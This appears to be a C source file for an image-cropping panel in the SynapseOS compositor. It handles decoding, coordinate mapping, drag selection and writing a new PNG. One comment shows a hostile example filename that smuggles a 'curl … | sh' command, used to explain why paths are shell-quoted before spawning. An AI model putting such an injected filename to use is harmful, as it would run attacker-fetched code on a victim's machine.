/*
 * crop.c — the image cropper (synctl dispatch crop <file>, or Dolphin's
 * right-click ▸ Crop Image)
 *
 * Opens an image full-screen, lets you drag a rectangle over it, and writes the
 * selection out as a new file. It is the one panel here that takes an argument,
 * because it is the one that operates on something rather than configuring
 * something.
 *
 * WHY IT IS A COMPOSITOR PANEL AND NOT A SCRIPT
 *
 * The obvious shell version is `slurp` for the region and ImageMagick for the
 * pixels. That does not work: slurp returns SCREEN coordinates, and turning
 * those into IMAGE coordinates needs to know exactly where and at what scale
 * the image is being displayed — which means something has to display it first.
 * Nothing on SynapseOS does. Once you are drawing the image anyway, the crop is
 * arithmetic and the dependency buys nothing.
 *
 * So: the same decoders wppick already uses for its previews, the panel pointer
 * contract for the drag, and cairo to write the result.
 *
 * COORDINATES
 *
 * The selection is held in IMAGE PIXELS, not screen pixels, and converted for
 * drawing. The other way round loses precision on every redraw — a 4000px-wide
 * photo fitted to a 1920px screen means one screen pixel is two image pixels,
 * so a selection stored on screen can only ever land on even coordinates, and
 * "crop exactly this" silently becomes "crop near this". It also breaks
 * outright the moment the panel moves to a different-sized output.
 *
 * WHAT IT WRITES
 *
 * Always a PNG, always a NEW file next to the original: <stem>-crop.png, with
 * -crop-2, -crop-3 … if that exists. Two deliberate choices:
 *
 *   - Never in place. A cropper that overwrites its input is one misdrag away
 *     from destroying the only copy of a photo, and there is no undo here.
 *   - PNG even for a JPEG input. Re-encoding a JPEG to crop it loses quality
 *     for no reason the user asked for; a lossless PNG is the honest output.
 *     Lossless JPEG cropping exists but needs the encoder and a whole
 *     block-alignment discussion, and that is not this.
 *
 * SynapseOS Project
 * SPDX-License-Identifier: GPL-2.0-or-later
 * https://github.com/velle999/SYNAPSE
 */

#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>

#include <cairo/cairo.h>
#include <wlr/types/wlr_damage_ring.h>
#include <wlr/util/log.h>

#include "synui.h"

/* Smallest selection worth writing, in image pixels. Below this a drag is
 * almost certainly a stray click, and writing a 2x1 PNG is never what anyone
 * meant. */
#define CROP_MIN_PX 8

/* ── Loading ─────────────────────────────────────────────── */

static bool has_ext(const char *path, const char *ext)
{
    size_t lp = strlen(path), le = strlen(ext);
    return lp > le && strcasecmp(path + lp - le, ext) == 0;
}

/* Decode into a cairo surface. The JPEG path is imgdec.c's — shared with the
 * wallpaper and the picker thumbnails, and the one place in the tree that
 * carries a libjpeg error manager and a longjmp, so a corrupt JPEG fails
 * closed instead of taking the compositor down. */
static cairo_surface_t *crop_decode(const char *path)
{
    cairo_surface_t *surf = NULL;

    if (has_ext(path, ".jpg") || has_ext(path, ".jpeg")) {
        surf = syn_decode_jpeg(path);
    } else {
        surf = cairo_image_surface_create_from_png(path);
        if (surf && cairo_surface_status(surf) != CAIRO_STATUS_SUCCESS) {
            cairo_surface_destroy(surf);
            surf = NULL;
        }
        /* A .png that is really a JPEG is common enough (browsers rename on
         * save) that trying the other decoder is worth more than being right
         * about the extension. */
        if (!surf) surf = syn_decode_jpeg(path);
    }

    if (!surf) return NULL;
    if (cairo_image_surface_get_width(surf) < 1 ||
        cairo_image_surface_get_height(surf) < 1) {
        cairo_surface_destroy(surf);
        return NULL;
    }
    return surf;
}

/* Drop the scaled copy. Called whenever the thing it was made from or the size
 * it was made for stops being true. */
static void crop_drop_scaled(syn_server_t *s)
{
    if (s->crop.scaled) {
        cairo_surface_destroy(s->crop.scaled);
        s->crop.scaled = NULL;
    }
    s->crop.scaled_at = 0.0;
}

static void crop_release(syn_server_t *s)
{
    crop_drop_scaled(s);
    if (s->crop.img) {
        cairo_surface_destroy(s->crop.img);
        s->crop.img = NULL;
    }
    s->crop.img_w = s->crop.img_h = 0;
    s->crop.dragging = 0;
}

/* ── The scaled copy ─────────────────────────────────────────
 *
 * Why this exists at all is on the struct in synui.h: resampling the source on
 * every pointer motion cost 122 ms a frame on a 24-megapixel photo and froze
 * the desktop for the length of the drag. This does that work once.
 *
 * Rebuilt when the scale changes rather than on some notification of an output
 * change, because the scale IS the thing that matters — crop_fit() derives it
 * from the output box, so a comparison here catches a resize, a move to another
 * monitor and a scale change without any of them having to know about a cache.
 */
cairo_surface_t *crop_scaled(syn_server_t *s, double scale)
{
    if (!s->crop.img) return NULL;

    /* crop_fit() never scales up, so 1:1 means the source is exactly what
     * should be painted. Copying it would double the memory of a 96 MB photo
     * to save nothing. */
    if (scale >= 0.999) {
        crop_drop_scaled(s);
        return s->crop.img;
    }

    if (s->crop.scaled && s->crop.scaled_at == scale)
        return s->crop.scaled;

    crop_drop_scaled(s);

    int w = (int)(s->crop.img_w * scale + 0.5);
    int h = (int)(s->crop.img_h * scale + 0.5);
    if (w < 1) w = 1;
    if (h < 1) h = 1;

    cairo_surface_t *sc = cairo_image_surface_create(CAIRO_FORMAT_ARGB32, w, h);
    if (!sc || cairo_surface_status(sc) != CAIRO_STATUS_SUCCESS) {
        if (sc) cairo_surface_destroy(sc);
        /* Out of memory for the copy — fall back to the source. The panel then
         * draws correctly and slowly instead of not at all, which is the right
         * way round for a cache. */
        wlr_log(WLR_ERROR, "synui: crop: cannot allocate a %dx%d scaled copy", w, h);
        return s->crop.img;
    }

    cairo_t *cr = cairo_create(sc);
    cairo_scale(cr, scale, scale);
    cairo_set_source_surface(cr, s->crop.img, 0, 0);
    /* GOOD, and now affordable: it is paid once per open instead of once per
     * motion event. The default filter drops pixels rather than averaging them
     * and a photo fitted from 6000px to 1900px comes out visibly aliased, which
     * reads as "the crop tool degraded my image" even though it only ever
     * affects this preview. */
    cairo_pattern_set_filter(cairo_get_source(cr), CAIRO_FILTER_GOOD);
    cairo_rectangle(cr, 0, 0, s->crop.img_w, s->crop.img_h);
    cairo_fill(cr);
    cairo_destroy(cr);

    s->crop.scaled    = sc;
    s->crop.scaled_at = scale;
    return sc;
}

/* ── Geometry ────────────────────────────────────────────────
 *
 * The image is fitted into the output with a margin, preserving aspect. Both
 * the render and the pointer need the same mapping, so it is computed here and
 * nowhere else — the drawn image and the clickable image drifting apart is the
 * exact failure hit.c exists to prevent, one level up.
 */
void crop_fit(syn_server_t *s, struct wlr_box *ob,
              double *scale, double *ox, double *oy)
{
    const int margin = 60;   /* room for the header and footer text */
    double aw = ob->width  - margin * 2;
    double ah = ob->height - margin * 2;
    if (aw < 1) aw = 1;
    if (ah < 1) ah = 1;

    double sx = aw / (double)s->crop.img_w;
    double sy = ah / (double)s->crop.img_h;
    double sc = sx < sy ? sx : sy;
    /* Never scale UP. A 64x64 icon blown across a 4K screen is a wall of
     * blur to select on, and the selection would be quantised to huge steps. */
    if (sc > 1.0) sc = 1.0;

    double dw = s->crop.img_w * sc, dh = s->crop.img_h * sc;
    *scale = sc;
    /* Whole pixels. The image is painted from a copy that is already at this
     * scale, and cairo resamples a blit landing on a fractional offset — which
     * costs a pass over the whole picture and softens it, both for the sake of
     * the half pixel that (width - dw) / 2 leaves when the difference is odd.
     * Rounded HERE rather than in the render so the pointer mapping rounds
     * identically; the two must agree to the pixel or the selection drifts from
     * the rectangle drawn around it. */
    *ox = (double)(int)(ob->x + (ob->width  - dw) / 2 + 0.5);
    *oy = (double)(int)(ob->y + (ob->height - dh) / 2 + 0.5);
}

/* Layout coords -> image pixels, clamped to the image. Clamping rather than
 * rejecting is what lets a drag that runs off the edge of the picture select
 * up to the edge, which is what dragging off the edge means. */
static void crop_to_image(syn_server_t *s, double lx, double ly, int *ix, int *iy)
{
    struct wlr_box ob;
    server_output_box(s, &ob);

    double sc, ox, oy;
    crop_fit(s, &ob, &sc, &ox, &oy);
    if (sc <= 0.0) { *ix = *iy = 0; return; }

    double x = (lx - ox) / sc;
    double y = (ly - oy) / sc;

    if (x < 0) x = 0;
    if (y < 0) y = 0;
    if (x > s->crop.img_w) x = s->crop.img_w;
    if (y > s->crop.img_h) y = s->crop.img_h;

    *ix = (int)(x + 0.5);
    *iy = (int)(y + 0.5);
}

/* The selection as a normalised rect in image pixels. The drag stores raw
 * anchor/current points, so this is what turns "dragged up and to the left"
 * into a rectangle with a positive width. */
void crop_selection(syn_server_t *s, int *x, int *y, int *w, int *h)
{
    int x0 = s->crop.ax, y0 = s->crop.ay;
    int x1 = s->crop.bx, y1 = s->crop.by;

    if (x1 < x0) { int t = x0; x0 = x1; x1 = t; }
    if (y1 < y0) { int t = y0; y0 = y1; y1 = t; }

    *x = x0; *y = y0;
    *w = x1 - x0; *h = y1 - y0;
}

int crop_has_selection(syn_server_t *s)
{
    int x, y, w, h;
    crop_selection(s, &x, &y, &w, &h);
    return w >= CROP_MIN_PX && h >= CROP_MIN_PX;
}

/* ── Writing it out ──────────────────────────────────────────
 *
 * Never overwrites: see the header. The suffix search stops at 999 so a
 * directory that somehow has them all fails loudly instead of looping. */
static bool crop_out_path(const char *in, char *out, size_t n)
{
    char stem[512];
    snprintf(stem, sizeof(stem), "%s", in);

    /* Strip the extension, if the basename has one. Checked on the BASENAME so
     * a directory called "my.photos" does not get truncated. */
    char *slash = strrchr(stem, '/');
    char *dot   = strrchr(slash ? slash : stem, '.');
    if (dot) *dot = '\0';

    snprintf(out, n, "%s-crop.png", stem);
    if (access(out, F_OK) != 0) return true;

    for (int i = 2; i < 1000; i++) {
        snprintf(out, n, "%s-crop-%d.png", stem, i);
        if (access(out, F_OK) != 0) return true;
    }
    return false;
}

/* Copy the selected rectangle into its own surface and write it.
 * Returns 0 on success. */
static int crop_write(syn_server_t *s, char *written, size_t wn)
{
    int x, y, w, h;
    crop_selection(s, &x, &y, &w, &h);

    /* Clamp to the image once more. The selection is already clamped on the way
     * in, but this is the call that indexes the pixel buffer and it should not
     * depend on that being true somewhere else. */
    if (x < 0) x = 0;
    if (y < 0) y = 0;
    if (x + w > s->crop.img_w) w = s->crop.img_w - x;
    if (y + h > s->crop.img_h) h = s->crop.img_h - y;
    if (w < 1 || h < 1) return -1;

    cairo_surface_t *out = cairo_image_surface_create(CAIRO_FORMAT_ARGB32, w, h);
    if (!out || cairo_surface_status(out) != CAIRO_STATUS_SUCCESS) {
        if (out) cairo_surface_destroy(out);
        return -1;
    }

    cairo_t *cr = cairo_create(out);
    /* SOURCE, not OVER: the crop should be the source pixels exactly, alpha
     * included. OVER would composite a transparent PNG onto the new surface's
     * zeroed (transparent black) background and premultiply the edges. */
    cairo_set_operator(cr, CAIRO_OPERATOR_SOURCE);
    cairo_set_source_surface(cr, s->crop.img, -(double)x, -(double)y);
    cairo_paint(cr);
    cairo_destroy(cr);

    char path[600];
    if (!crop_out_path(s->crop.path, path, sizeof(path))) {
        cairo_surface_destroy(out);
        wlr_log(WLR_ERROR, "synui: crop: no free output name beside '%s'",
                s->crop.path);
        return -1;
    }

    cairo_status_t st = cairo_surface_write_to_png(out, path);
    cairo_surface_destroy(out);

    if (st != CAIRO_STATUS_SUCCESS) {
        wlr_log(WLR_ERROR, "synui: crop: cannot write '%s': %s",
                path, cairo_status_to_string(st));
        return -1;
    }

    snprintf(written, wn, "%s", path);
    wlr_log(WLR_INFO, "synui: crop: wrote %s (%dx%d from %dx%d)",
            path, w, h, s->crop.img_w, s->crop.img_h);
    return 0;
}

/* ── Shell quoting ───────────────────────────────────────────
 *
 * THE PATH IS UNTRUSTED. It arrives as an argument — from Dolphin's context
 * menu, from `synctl dispatch crop <path>`, from anything that can reach the
 * control socket — and synui_spawn() runs /bin/sh -c. A file called
 *
 *     holiday'; curl http://…​ | sh; '.png
 *
 * would execute the moment it was cropped, and a filename is trivially
 * attacker-chosen: it survives a download, an unzip or a USB stick.
 *
 * Single quotes make the shell take every byte literally, and the '\'' dance is
 * the only way to carry a literal single quote through them. Same helper
 * curpick uses on theme directory names, and here for the same reason.
 */
static void crop_shell_quote(const char *in, char *out, size_t n)
{
    size_t o = 0;
    if (n < 3) { if (n) out[0] = '\0'; return; }

    out[o++] = '\'';
    for (size_t i = 0; in[i] && o + 8 < n; i++) {
        if (in[i] == '\'') {
            out[o++] = '\''; out[o++] = '\\'; out[o++] = '\''; out[o++] = '\'';
        } else {
            out[o++] = in[i];
        }
    }
    out[o++] = '\'';
    out[o]   = '\0';
}

/* ── Show / hide ─────────────────────────────────────────── */

void crop_open(syn_server_t *s, const char *path)
{
    if (!path || !*path) {
        wlr_log(WLR_ERROR, "synui: crop: needs a file to open");
        return;
    }

    crop_release(s);

    cairo_surface_t *img = crop_decode(path);
    if (!img) {
        /* A toast rather than a silent no-op: this is reached from a file
         * manager's context menu, where nothing else would say why the screen
         * did not change. */
        wlr_log(WLR_ERROR, "synui: crop: cannot decode '%s'", path);
        char cmd[600];
        snprintf(cmd, sizeof(cmd),
                 "notify-send -a synui 'Crop' 'Cannot open that image'");
        synui_spawn(cmd);
        return;
    }

    s->crop.img   = img;
    s->crop.img_w = cairo_image_surface_get_width(img);
    s->crop.img_h = cairo_image_surface_get_height(img);
    syn_utf8_copy(s->crop.path, sizeof(s->crop.path), path);
    s->crop.status[0] = '\0';

    /* Open with the whole image selected. "Crop nothing" is never the intent,
     * and a full selection means Enter is a no-op copy rather than an error —
     * and it shows what the handles do before you have touched anything. */
    s->crop.ax = 0;
    s->crop.ay = 0;
    s->crop.bx = s->crop.img_w;
    s->crop.by = s->crop.img_h;
    s->crop.dragging = 0;

    s->crop.visible = 1;
    synui_render_crop(s);
}

void crop_hide(syn_server_t *s)
{
    s->crop.visible = 0;
    s->crop.dragging = 0;
    synui_render_crop(s);
    /* The surface can be large — a 6000x4000 photo is ~96 MB — and this panel
     * is opened once in a while rather than lived in. Nothing is cached. */
    crop_release(s);
    ctlpanel_child_closed(s, "crop");
}

void crop_toggle(syn_server_t *s)
{
    /* Without a path there is nothing to toggle INTO, so a bare toggle can only
     * ever close. Opening is crop_open()'s job and it needs an argument. */
    if (s->crop.visible) crop_hide(s);
    else wlr_log(WLR_INFO, "synui: crop: needs a file — `synctl dispatch crop <path>`");
}

/* ── Pointer ─────────────────────────────────────────────────
 *
 * A press-drag-release, unlike every other panel here, because a rectangle is
 * what is being described. The press starts it, pointer_motion in input.c feeds
 * it while s->crop.dragging is set, and the release ends it — the same three
 * hooks the desktop-icon drag uses.
 */

int crop_click(syn_server_t *s, double lx, double ly, uint32_t button,
               uint32_t time_msec)
{
    (void)time_msec;
    if (!s->crop.visible) return 0;
    if (button != BTN_LEFT) return 1;

    int ix, iy;
    crop_to_image(s, lx, ly, &ix, &iy);

    s->crop.ax = s->crop.bx = ix;
    s->crop.ay = s->crop.by = iy;
    s->crop.dragging = 1;
    s->crop.status[0] = '\0';

    synui_render_crop(s);
    return 1;
}

void crop_drag_motion(syn_server_t *s, double lx, double ly)
{
    if (!s->crop.visible || !s->crop.dragging) return;
    crop_to_image(s, lx, ly, &s->crop.bx, &s->crop.by);
    synui_render_crop(s);
}

void crop_drag_end(syn_server_t *s, double lx, double ly)
{
    if (!s->crop.visible || !s->crop.dragging) return;
    crop_to_image(s, lx, ly, &s->crop.bx, &s->crop.by);
    s->crop.dragging = 0;

    /* A click with no travel is not a selection. Put the whole image back
     * rather than leaving a zero-size rect that Enter would refuse to write —
     * a panel that silently stops responding to Enter is worse than one that
     * visibly resets. */
    if (!crop_has_selection(s)) {
        s->crop.ax = 0; s->crop.ay = 0;
        s->crop.bx = s->crop.img_w; s->crop.by = s->crop.img_h;
    }
    synui_render_crop(s);
}

int crop_motion(syn_server_t *s, double lx, double ly)
{
    (void)lx; (void)ly;
    /* The drag itself is fed by input.c's pointer_motion through
     * crop_drag_motion(); this only claims the pointer so it never reaches the
     * window underneath the full-screen panel. */
    return s->crop.visible ? 1 : 0;
}

int crop_scroll(syn_server_t *s, double lx, double ly, double delta)
{
    (void)lx; (void)ly; (void)delta;
    return s->crop.visible ? 1 : 0;   /* modal: swallow the wheel */
}

/* ── Keys ────────────────────────────────────────────────── */

/* Nudge one edge of the selection. Arrows move the far corner, which is the one
 * the drag was still holding — so keyboard adjustment continues the gesture
 * rather than starting a different one. */
static void crop_nudge(syn_server_t *s, int dx, int dy, int step)
{
    s->crop.bx += dx * step;
    s->crop.by += dy * step;

    if (s->crop.bx < 0) s->crop.bx = 0;
    if (s->crop.by < 0) s->crop.by = 0;
    if (s->crop.bx > s->crop.img_w) s->crop.bx = s->crop.img_w;
    if (s->crop.by > s->crop.img_h) s->crop.by = s->crop.img_h;
}

int crop_key(syn_server_t *s, xkb_keysym_t sym, uint32_t mods)
{
    if (!s->crop.visible) return 0;

    /* Shift makes the arrows coarse. A 6000px photo needs more than 1px per
     * keypress to be adjustable by keyboard at all. */
    int step = (mods & WLR_MODIFIER_SHIFT) ? 25 : 1;

    switch (sym) {
    case XKB_KEY_Escape:
    case XKB_KEY_q:
        crop_hide(s);
        return 1;

    case XKB_KEY_Return:
    case XKB_KEY_KP_Enter: {
        if (!crop_has_selection(s)) {
            snprintf(s->crop.status, sizeof(s->crop.status),
                     "Selection is too small");
            synui_render_crop(s);
            return 1;
        }
        char written[600];
        if (crop_write(s, written, sizeof(written)) == 0) {
            /* QUOTED, not interpolated — the output name is derived from the
             * input path, which is untrusted. See crop_shell_quote(). */
            char q[sizeof(written) * 4 + 8];
            crop_shell_quote(written, q, sizeof(q));

            /* Report by toast, not just in the log — this is reached from a
             * file manager and the panel disappears on success, so without it
             * there is nothing to say a file was written or where. */
            char cmd[sizeof(q) * 2 + 64];
            snprintf(cmd, sizeof(cmd),
                     "notify-send -a synui -i %s 'Cropped' %s", q, q);
            synui_spawn(cmd);
            crop_hide(s);
        } else {
            snprintf(s->crop.status, sizeof(s->crop.status),
                     "Could not write the file");
            synui_render_crop(s);
        }
        return 1;
    }

    /* Select everything again — the way back from a bad drag. */
    case XKB_KEY_a:
        s->crop.ax = 0; s->crop.ay = 0;
        s->crop.bx = s->crop.img_w; s->crop.by = s->crop.img_h;
        s->crop.status[0] = '\0';
        synui_render_crop(s);
        return 1;

    case XKB_KEY_Left:  crop_nudge(s, -1,  0, step); synui_render_crop(s); return 1;
    case XKB_KEY_Right: crop_nudge(s,  1,  0, step); synui_render_crop(s); return 1;
    case XKB_KEY_Up:    crop_nudge(s,  0, -1, step); synui_render_crop(s); return 1;
    case XKB_KEY_Down:  crop_nudge(s,  0,  1, step); synui_render_crop(s); return 1;

    default:
        return 1;   /* modal, as every other panel is */
    }
}
